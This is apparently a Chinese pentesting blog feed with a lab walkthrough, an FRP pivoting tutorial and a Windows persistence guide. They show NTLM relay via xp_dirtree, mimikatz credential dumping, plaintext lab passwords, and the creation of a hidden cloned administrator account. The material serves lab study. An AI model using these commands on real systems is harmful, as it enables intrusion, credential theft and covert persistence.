autoroute -s 192.168.93.0/24</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211026162724679.png" alt="image-20211026162724679"></p><p>因为已经将msf带入了内网所以第一步探测内网存活主机</p><pre><code>use auxiliary/scanner/discovery/udp_probe  //使用的时基于UDP协议的探测set rhosts 192.168.93.0/24set threads 10 </code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211026181852362.png" alt="image-20211026181852362"></p><p>搭建个隧道，为了测试更完整，这里采用ew搭建隧道</p><p>因为centos有两个网卡，一个是内网，一个外网，而后面的虚拟机都只有一个网卡，所以就是一级环境（当然真实环境肯定不是这样的自己判断）</p><p>在centos上搭建ew</p><p>我采用的是正向代理，因为centos有一个公网。</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211026174648074.png" alt="image-20211026174648074"></p><p>nmap一下看看代理是否成功</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211026175807451.png" alt="image-20211026175807451"></p><p>目前已知网段是192.168.93.10  , 20 ,  30  刚好对应了我们的主机</p><p>本来想用nmap扫描一下端口，但是代理的速度实在是太慢了。既然本来已经有了meterpreter了，那么前面也添加了路由，msf也进去了内网，我就是用tcp的方式去扫描端口</p><pre><code>use auxiliary/scanner/portscan/tcp</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211027111907006.png" alt="image-20211027111907006"></p><p>扫出来没几个，先不管</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211027112700148.png" alt="image-20211027112700148"></p><p>在扫一下20网段</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211027113626222.png" alt="image-20211027113626222"></p><p>扫描30网段</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211027113942297.png" alt="image-20211027113942297"></p><h3 id="主机信息收集"><a href="#主机信息收集" class="headerlink" title="主机信息收集"></a>主机信息收集</h3><p>因为都开放了445端口，那么上一波smb_version扫描一下</p><p>10网段</p><p><img src="/images/loading.gif" data-original="C:%5CUsers%5C77960%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211027113406349.png" alt="image-20211027113406349"></p><p>得到这是个windows2012</p><p>20网段</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211027114219708.png" alt="image-20211027114219708"></p><p>得到这是个windows2008</p><p>30网段</p><p><img src="/images/loading.gif" data-original="C:%5CUsers%5C77960%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211027114308052.png" alt="image-20211027114308052"></p><p>得到这是个win7</p><p>因为前面开了隧道代理，试着访问一下80端口</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211027114713644.png" alt="image-20211027114713644"></p><p>没有东西，欺骗感情。</p><h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><p>因为前面20端口扫到一个1433，mssql的服务端口，那么想了想，之前不是拿到过mysql的账号，会不会是一个样的</p><p>testuser  cvcvgjASD!@</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211027150548152.png" alt="image-20211027150548152"></p><p>果然一样</p><p>根据网上搜集资料，说使用Responder MultiRelay.py 进行中继攻击，没有学过这，记下来，打完靶机就总结</p><blockquote><p>使用mssql的密码(同mysql)访问centos获取到win2008 administrator的ntlmv2后中继到win7, 然后获取到win7凭据后登陆win2008,然后窃取test\administrator令牌, 登陆域控</p></blockquote><p><a href="https://github.com/lgandx/Responder" target="_blank" rel="noopener">https://github.com/lgandx/Responder</a></p><p>首先安装Responder</p><pre><code>python Responder.py -I eth1 -wrf</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211027143831211.png" alt="image-20211027143831211"></p><p>因为是普通用户权限，无法开启xp_cmdshell去执行命令，之后使用auxiliary/admin/mssql/mssql_ntlm_stealer，执行xp_dirtree，触发UNC</p><blockquote><p>xp_dirtree：扩展存储过程  </p><p>这个存储过程实际上是让SQL服务实例对提供的文件路径进行目录遍历。通过UNC路径，将服务器指重定向到攻击者控制的主机上，我们通常可以使用Responder或ntlmrelayx等工具来捕获SQL Server服务帐户密码的NetNTLMv2哈希值，或者转发服务帐户的凭据并使用它们通过SMB对辅助主机进行身份验证</p><p>UNC：通用命名规则</p><p>格式：\\servername\sharename，其中servername是服务器名。sharename是共享资源的名称</p><p>访问该文件夹，在同网络中，输入\\ + 对方的ip或+对方的主机名即可访问对方共享的文件夹</p></blockquote><p>注意这里需要设置的几个点，主要是SMBPROXY这个时攻击者的ip地址，这里是拿centos去攻击的，也就是说拿centos的eth1的IP地址192.168.93.100</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211027151311851.png" alt="image-20211027151311851"></p><pre><code>set password cvcvgjASD!@set rhosts 192.168.93.20set smbproxy 192.168.93.100set username testuser</code></pre><p>smb伪造的服务器这边就接受到了NTLMv2，相比NTLMv1 v2会更加难以破解</p><p>NTLMv1是8字节的，NTLMv2是16字节   net-ntlm hash是ntlm hash 和challenge加密的，用作ntlm认证。net-ntlm hash一般用于网络环境的，ntlm hash 用于本地认证</p><p><img src="/images/loading.gif" data-original="C:%5CUsers%5C77960%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211027152228767.png" alt="image-20211027152228767"></p><p>去kali的john解密一下</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211027155324061.png" alt="image-20211027155324061"></p><p>当然会遇到解不出来的情况下，可以用MultiRelay 中继攻击</p><p>因为获取的是08的hash，尝试去打30</p><pre><code>python3 MultiRelay.py -t 192.168.93.30 -u Administrator  /不知道账号的情况下写ALL，知道的情况下可以写知道的账号</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211027173253829.png" alt="image-20211027173253829"></p><p>遇到问题了，没有python3环境。在centos上wget，git半天都不行，只有从本地下载弄上去。</p><p>但是希望来了，centos上面有scp</p><blockquote><p>scp： scp 是 linux 系统下基于 ssh 登陆进行安全的远程文件拷贝命令</p></blockquote><p>但是我也没用到scp，因为我用FinalShell连接的SSH，可以直接上传</p><p>捣鼓了半天，centos里面啥都没有，下载完python，和别的弄完后，又是另一个环境没有，就放弃了。就说了一下后续的方法</p><p>前提：过去的本地管理员的密码相同，只要能中继过去，那么就说明他们的密码一致</p><p>1.先执行</p><pre><code>python3 MultiRelay.py -t 192.168.93.30 -u Administrator</code></pre><p>因为win7和2008的本地管理员的密码一致</p><p>2.在攻击机上面再次使用mssql_ntlm_stealer 执行xp_dirtree 触发UNC</p><p>3.centos就能获取到win7的shell，这个shell就能上传</p><p>参考：<a href="https://xz.aliyun.com/t/6988#toc-4" target="_blank" rel="noopener">https://xz.aliyun.com/t/6988#toc-4</a></p><p>administrator  123qwe!ASD</p><h3 id="采用wmiexec工具"><a href="#采用wmiexec工具" class="headerlink" title="采用wmiexec工具"></a>采用wmiexec工具</h3><p>这里的！会把前面截断，所以加了一个\逃逸出来</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211028124509631.png" alt="image-20211028124509631"></p><p>因为环境不出网，想直接开启3389远程看看</p><pre><code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211028130035367.png" alt="image-20211028130035367"></p><p>没开成功，尝试wmic</p><pre><code>wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1 //不知道为什么 reg开启3389不行，wmic倒是成功了。</code></pre><p>不知道为什么 reg开启3389不行，wmic倒是成功了。</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211028130613530.png" alt="image-20211028130613530"></p><h3 id="win2008信息收集"><a href="#win2008信息收集" class="headerlink" title="win2008信息收集"></a>win2008信息收集</h3><pre><code>ipconfig /all   查看本机ip，所在域 route print     打印路由信息 net view        查看局域网内其他主机名 arp -a          查看arp缓存 net start       查看开启了哪些服务 net share       查看开启了哪些共享 net share ipc$  开启ipc共享 net share c$    开启c盘共享 net use \\192.168.xx.xx\ipc$ "" /user:""   与192.168.xx.xx建立空连接 net use \\192.168.xx.xx\c$ "密码" /user:"用户名"  建立c盘共享 dir \\192.168.xx.xx\c$\user    查看192.168.xx.xx c盘user目录下的文件 ​ net config Workstation   查看计算机名、全名、用户名、系统版本、工作站、域、登录域 net user                 查看本机用户列表 net user /domain         查看域用户 net localgroup administrators   查看本地管理员组（通常会有域用户） net view /domain         查看有几个域 net user 用户名 /domain   获取指定域用户的信息 net group /domain        查看域里面的工作组，查看把用户分了多少组（只能在域控上操作） net group 组名 /domain    查看域中某工作组 net group "domain admins" /domain  查看域管理员的名字 net group "domain computers" /domain  查看域中的其他主机名 net group "doamin controllers" /domain  查看域控制器（可能有多台）</code></pre><p>经过一波信息收集得到</p><pre><code>域：test.org   //就一个域当前主机名：WIN2008</code></pre><p>想执行别的命令，出现这个原因，就收集到没几个信息</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211028133301027.png" alt="image-20211028133301027"></p><p>😁😁😁😁😁😁</p><h3 id="impacket-smbclient-py"><a href="#impacket-smbclient-py" class="headerlink" title="impacket-smbclient.py"></a>impacket-smbclient.py</h3><p>既然能拿到2008的shell，那么可以用smbclient上传mimikatz，读取密码</p><p>使用说明：<a href="https://www.jianshu.com/p/17224c6889ef" target="_blank" rel="noopener">https://www.jianshu.com/p/17224c6889ef</a></p><pre><code>smbclient.py administrator:123qwe!ASD@192.168.93.20</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211028141156902.png" alt="image-20211028141156902"></p><p>但是执行上面的put不太好使，使用kali自带的</p><pre><code>smbclient //192.168.93.20/c$ -U administrator</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211028142209600.png" alt="image-20211028142209600"></p><p>使用put上传文件</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211028142546885.png" alt="image-20211028142546885"></p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211028142610011.png" alt="image-20211028142610011"></p><p>打开3389，使用mimikatz读取密码</p><pre><code>privilege::debugsekurlsa::logonpasswords</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211028143043878.png" alt="image-20211028143043878"></p><p>读到了域控的管理员账号和密码</p><h2 id="域控"><a href="#域控" class="headerlink" title="域控"></a>域控</h2><pre><code>administrator  zxcASDqw123!!</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211028151228066.png" alt="image-20211028151228066"></p><p>拿下域控</p><p>再次使用smbclient工具下载flag.txt</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211028151632298.png" alt="image-20211028151632298"></p><p>查看flag</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211028151656611.png" alt="image-20211028151656611"></p><p>完成目标</p>]]></content>
      
      
      <categories>
          
          <category> 靶机渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶机渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>宝塔绕过</title>
      <link href="/posts/10a9.html"/>
      <url>/posts/10a9.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>隧道搭建frp</title>
      <link href="/posts/3378.html"/>
      <url>/posts/3378.html</url>
      
        <content type="html"><![CDATA[<h1 id="FRP"><a href="#FRP" class="headerlink" title="FRP"></a>FRP</h1><blockquote><p>frp 是一个可用于内网穿透的高性能的反向代理应用，支持TCP、UDP协议，为HTTP和HTTPS应用协议提供了额外的能力，且尝试性支持了点对点穿透</p><p>FRP最大的一个特点是使用SOCKS代理，而SOCKS是加密通信的，类似于做了一个加密的隧道，可以把外网的流量，通过加密隧道穿透到内网。效果有些类似于VPN。</p><p>frp的好处是利用内网或防火墙后的机器，对外网环境提供http或https服务。对于http和https服务支持基于域名的虚拟主机，支持自定义域名绑定，使多个域名可以共用一个80端口。利用处于内网或防火墙后的机器，对外网环境提供tcp和udp服务，例如在家里通过ssh或者web访问公司内网环境内的主机或者业务进行办</p></blockquote><p>下载地址</p><blockquote><p><a href="https://github.com/fatedier/frp/releases/tag/v0.37.1" target="_blank" rel="noopener">https://github.com/fatedier/frp/releases/tag/v0.37.1</a></p></blockquote><p>条件</p><blockquote><p>因为内网是没有公网ip地址，所以不能被外网访问到，也就是说内网可以访问外网，这是frp搭建的前提条件，因为端口映射过来必须内网是能够访问到vps上面去的。</p><p>这种就跟Nginx的反向代理一样，通过内网端口映射到Nginx服务器上的端口，我们外网访问Nginx的端口访问内网资源</p></blockquote><p>环境搭建：</p><blockquote><p>外网：kali   192.168.1.132  </p><p>vps：腾讯云 </p><p>内网：win7 192.168.93.128 </p></blockquote><p>公网vps作为服务端，内网作为客户端。</p><h2 id="一级代理"><a href="#一级代理" class="headerlink" title="一级代理"></a>一级代理</h2><h3 id="服务器配置"><a href="#服务器配置" class="headerlink" title="服务器配置"></a>服务器配置</h3><p>首先下载对应版本的frp</p><pre><code>wget https://github.com/fatedier/frp/releases/download/v0.34.3/frp_0.34.3_linux_amd64.tar.gztar zxvf frp_0.34.3_linux_amd64.tar.gz</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211022134507190.png" alt="image-20211022134507190"></p><p>改个名字方便一点</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211022134620379.png" alt="image-20211022134620379"></p><p>因为我们的vps作为服务端，所以还需要把客户端的东西删除</p><pre><code>rm frpcrm frpc.ini</code></pre><p>删除完了打开服务端的配置文件frps.ini</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211022135059404.png" alt="image-20211022135059404"></p><p>虽然里面只有这但是可以配置一下这些内容的</p><pre><code>bind_addr = 0.0.0.0 #绑定的ip，为本机bind_port = 7000 #绑定的端口dashboard_addr = 0.0.0.0 #管理地址dashboard_port = 7500 #管理端口  这里端口是我们访问图形化界面时候用到的dashboard_user = root #管理的用户名dashboard_pwd = ash #管理用户的密码token = ashupup #客户端服务端连接的密码heartbeat_timeout = 90 #心跳超时时间max_pool_count = 5 #最大同时连接数vhost_http_port = 10080 vhost_https_port = 10443  #vhost_http_port”和“vhost_https_port”用于反向代理HTTP主机时使用</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211022135510307.png" alt="image-20211022135510307"></p><p>linux环境下执行</p><pre><code>./frps -c frps.ini</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211022135619781.png" alt="image-20211022135619781"></p><p>windows下面执行</p><pre><code>frps.exe -c frps.ini</code></pre><p>然后访问  ip:7500</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211022165327395.png" alt="image-20211022165327395"></p><h3 id="客户端配置"><a href="#客户端配置" class="headerlink" title="客户端配置"></a>客户端配置</h3><p>通过上传frp</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211022165621516.png" alt="image-20211022165621516"></p><p>修改客户端</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211022170743438.png" alt="image-20211022170743438"></p><pre><code>[common]server_addr = vps地址server_port = 7000 //服务器绑定的端口token = ashupup //服务端中是指的密码[web] //服务器名，随便取ssh，rdp都行type = tcp #连接协议类型local_ip = 127.0.0.1 #访问的ip可以是内网任何一个iplocal_port = 3389 #本地端口（根据协议修改）remote_port = 6000 #远程服务器的ip端口plugin = socks5               #使用的协议use_encryption = true         #是否加密use_compression = true</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211024153956926.png" alt="image-20211024153956926"></p><p>设置完之后启动</p><pre><code>frpc.exe -c frpc.ini</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211022174142672.png" alt="image-20211022174142672"></p><p>回到界面可以看到，已经回弹了一个</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211022174306056.png" alt="image-20211022174306056"></p><p>然后打开mstsc<img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211022174441123.png" alt="image-20211022174441123"></p><p>或者设置个代理</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211024124054212.png" alt="image-20211024124054212"></p><h2 id="二级代理"><a href="#二级代理" class="headerlink" title="二级代理"></a>二级代理</h2><p>环境搭建</p><pre><code>kali    192.168.1.132            通vpswin7-1  192.168.1.122        通外网        192.168.100.130      不通外网 win7-2    192.168.100.129        不通外网        192.168.93.130            不通windows2008  192.168.93.129     不通</code></pre><h3 id="vps配置"><a href="#vps配置" class="headerlink" title="vps配置"></a>vps配置</h3><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211024155430957.png" alt="image-20211024155430957"></p><p>跟一级代理没有变，跟客户端绑定的端口还是7000，访问页面的端口还是7500</p><h3 id="win7-1配置"><a href="#win7-1配置" class="headerlink" title="win7-1配置"></a>win7-1配置</h3><p>配置frp的客户端fprs</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211024165742566.png" alt="image-20211024165742566"></p><p>回到kali配置代理</p><pre><code>vi /etc/proxychains.conf</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211024171000097.png" alt="image-20211024171000097"></p><p>扫描一下100的地址</p><pre><code>proxychains nmap -sT -Pn -p 3389 -T4 192.168.100.129</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211024172913473.png" alt="image-20211024172913473"></p><p>接下来设置socks5访问到93网段的</p><p>回到win7-1配置frps的服务端</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211024173229917.png" alt="image-20211024173229917"></p><p>别的内容可以自己添加</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211024182228675.png" alt="image-20211024182228675"></p><h3 id="win7-2配置"><a href="#win7-2配置" class="headerlink" title="win7-2配置"></a>win7-2配置</h3><p>来到win7-2的位置配置客户端</p><pre><code>[common]server_addr = 192.168.100.130 server_port = 7000[socks5]type = tcpremote_port = 8888plugin = socks5use_encryption = trueuse_compression = true</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211024182343907.png" alt="image-20211024182343907"></p><p>回到kali配置proxychains</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211024182444884.png" alt="image-20211024182444884"></p><h3 id="扫描2008的445端口"><a href="#扫描2008的445端口" class="headerlink" title="扫描2008的445端口"></a>扫描2008的445端口</h3><pre><code>proxychains nmap -sT -Pn -p 445 -T4 192.168.93.129</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211024204936798.png" alt=""></p><p>总结：</p><p>因为内网资源无法访问，需要把内网服务器作为跳板，从而访问内网的资源。首先在win7-1的位置作为客户端，模拟一级代理，映射到vps的6000的端口，然后就能访问100网段。这时候把现在win7-1跳板机作为frp服务器，把win7-2作为跳板机，搭建代理访问win2008</p><p>win7-1 映射到vps的6000端口</p><p>win7-2 映射到win7-1的8888端口</p><h2 id="三级代理"><a href="#三级代理" class="headerlink" title="三级代理"></a>三级代理</h2><p>三级代理和二级一样，只是多加了一个内网网段</p><pre><code>kali    192.168.1.132            通vpswin7-1  192.168.1.122        通外网        192.168.100.130      不通外网 win7-2    192.168.100.129        不通外网        192.168.93.130            不通windows2008  192.168.93.129     不通            192.168.114.128  不通ubuntu 192.168.114.129   不通</code></pre><p>同样的道理，前面的步骤都是一样的</p><h3 id="win7-2开启服务端"><a href="#win7-2开启服务端" class="headerlink" title="win7-2开启服务端"></a>win7-2开启服务端</h3><p><img src="/images/loading.gif" data-original="C:%5CUsers%5C77960%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211024205210395.png" alt="image-20211024205210395"></p><h3 id="2008配置"><a href="#2008配置" class="headerlink" title="2008配置"></a>2008配置</h3><p>在2008开启一个客户端</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211024205251572.png" alt="image-20211024205251572"></p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211024205142101.png" alt="image-20211024205142101"></p><p>回到kali设置代理</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211024205402407.png" alt="image-20211024205402407"></p><p>扫一下ubuntu的22端口</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211024210129301.png" alt="image-20211024210129301"></p><p>可以看到3层代理</p><h2 id="无需配置跟参数版本"><a href="#无需配置跟参数版本" class="headerlink" title="无需配置跟参数版本"></a>无需配置跟参数版本</h2><p>下载地址：<a href="https://github.com/uknowsec/frpModify" target="_blank" rel="noopener">https://github.com/uknowsec/frpModify</a></p><p>上传文件，还要给frps_linux_amd64加可执行权限</p><pre><code>chmod u+x frps_linux_amd64</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211024223034179.png" alt="image-20211024223034179"></p><pre><code>./frps -h  //查看参数</code></pre><p>为了方便我把frps_linux_amd64改成frps</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211024230446896.png" alt="image-20211024230446896"></p><p>在win7上传客户端</p><pre><code>frpc.exe -t VPSIP -p 7000</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211024230513728.png" alt="image-20211024230513728"></p><p>无配置文件里面的映射的端口默认是23333</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211024230817089.png" alt="image-20211024230817089"></p><blockquote><p>思考：<br>当遇到Nginx反向代理，内网比如80端口映射到Nginx的8080端口，我们访问的只是映射的ip地址加端口，并不是真实的内网ip地址。</p><p>但是当我们拿到web的shell（这个shell是内网web服务器的shell，不是Nginx的shell）之后，进入了内网，但是呢我们外网只能访问8080端口也就是内网的80端口。所以这时候就需要我们搭建隧道，比如frp，这样就能访问别的端口，不然不能访问，因为这个内网web服务器是没有公网的ip地址。然后本地SocksCap、Proxifier代理以方便我们使用别的工具进行渗透</p></blockquote><p>参考链接：<br><a href="https://www.cnblogs.com/sunny11/p/14264293.html" target="_blank" rel="noopener">https://www.cnblogs.com/sunny11/p/14264293.html</a></p><p><a href="https://www.freebuf.com/sectool/280226.html" target="_blank" rel="noopener">https://www.freebuf.com/sectool/280226.html</a></p><p><a href="https://sec-in.com/article/1155" target="_blank" rel="noopener">https://sec-in.com/article/1155</a></p><p><a href="https://www.secpulse.com/archives/146653.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/146653.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windows权限维持</title>
      <link href="/posts/4e76.html"/>
      <url>/posts/4e76.html</url>
      
        <content type="html"><![CDATA[<h1 id="windows的权限维持总结"><a href="#windows的权限维持总结" class="headerlink" title="windows的权限维持总结"></a>windows的权限维持总结</h1><p>前言:博客的所有文章只是自己学习的过程，参考各大佬的文章来学习，还有自己的理解，知识点比较浅，见谅。</p><h1 id="操作系统的权限维持"><a href="#操作系统的权限维持" class="headerlink" title="操作系统的权限维持"></a>操作系统的权限维持</h1><p>当我们获取到一定的权限后，往往通过建立后门来维持对目标主机的控制权限。这样一来即使目标修复了攻击者利用漏洞获得得权限，攻击者也可以通过后门得形式继续控制目标系统。</p><h2 id="隐藏用户"><a href="#隐藏用户" class="headerlink" title="隐藏用户"></a>隐藏用户</h2><p>原理：该方法就是创建一个看不见得用户，只能在注册表发现</p><h3 id="1-首先创建用户"><a href="#1-首先创建用户" class="headerlink" title="1.首先创建用户"></a>1.首先创建用户</h3><pre><code>net user ash$ 123.com /addnet localgroup administrators ash$ /add</code></pre><p>创建一个ash用户 注意后面要有$ 并且隐藏账户是指在使用 net user 命令下看不到的账户</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211019110542492.png" alt="image-20211019110542492"></p><pre><code>net localgroups administrators</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211019110611325.png" alt="image-20211019110611325"></p><p>可以看到在管理员组里面有ash$的账户，仅仅只是net user看不到，找到控制面板里面的计算机管理</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211019111935000.png" alt="image-20211019111935000"></p><p>也能看得到。</p><h3 id="2-打开注册表"><a href="#2-打开注册表" class="headerlink" title="2.打开注册表"></a>2.打开注册表</h3><p>我们只需要打开注册表regedit  ，找到<strong>HKEY_LOCAL_MACHINE/SAM/SAM/Domains/Account/Users/</strong>选项</p><p>但是这时候我们打开后发现是没有domains文件</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211019112332254.png" alt="image-20211019112332254"></p><p>这是因为我们的权限不够，右键权限，给administrator加上。然后重开注册表就能看到了</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211019112453911.png" alt="image-20211019112453911"></p><p>打开后</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211019112553056.png" alt="image-20211019112553056"></p><p>这时候点开name，找到administrator  0x1f4 相对应的上面的000001F4</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211019112743109.png" alt="image-20211019112743109"></p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211019112906728.png" alt="image-20211019112906728"></p><p>复制下来，然后再找到我们刚才创建的ash$的右边相同的目录也就是</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211019113033703.png" alt="image-20211019113033703"></p><p>再把刚才000001F4复制下来的粘贴到000003EA的F里面，然后导出000003EA和ash$</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211019113315700.png" alt="image-20211019113315700"></p><p>导出来后就可以删除ash$账户</p><pre><code>net user ash$ /del</code></pre><h3 id="3-导入注册表"><a href="#3-导入注册表" class="headerlink" title="3.导入注册表"></a>3.导入注册表</h3><p>点击左上角的文件导入，选择我们刚才导出的两个。导入成功后只有在注册表的位置才能看到</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211019113713471.png" alt="image-20211019113713471"></p><h3 id="4-脚本使用"><a href="#4-脚本使用" class="headerlink" title="4.脚本使用"></a>4.脚本使用</h3><p>参考：<a href="https://3gstudent.github.io/渗透技巧-Windows系统的帐户隐藏" target="_blank" rel="noopener">https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%B8%90%E6%88%B7%E9%9A%90%E8%97%8F</a></p><p>脚本：<a href="https://github.com/3gstudent/Windows-User-Clone" target="_blank" rel="noopener">https://github.com/3gstudent/Windows-User-Clone</a></p><p>第二个脚本下载地址<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1" target="_blank" rel="noopener">Invoke-TokenManipulation.ps1</a> ：<a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Exfiltration" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit/tree/master/Exfiltration</a></p><p>将脚本上传到指定目标主机</p><p>可以通过msf的upload上传</p><pre><code>upload xxxx.ps1 c:\\</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211019114115929.png" alt="image-20211019114115929"></p><p>1.设置当前的用户的执行 策略为Unrestricted</p><pre><code>Get-ExecutionPolicy  //得到当前用户的执行策略Set-ExecutionPolicy Unrestricted  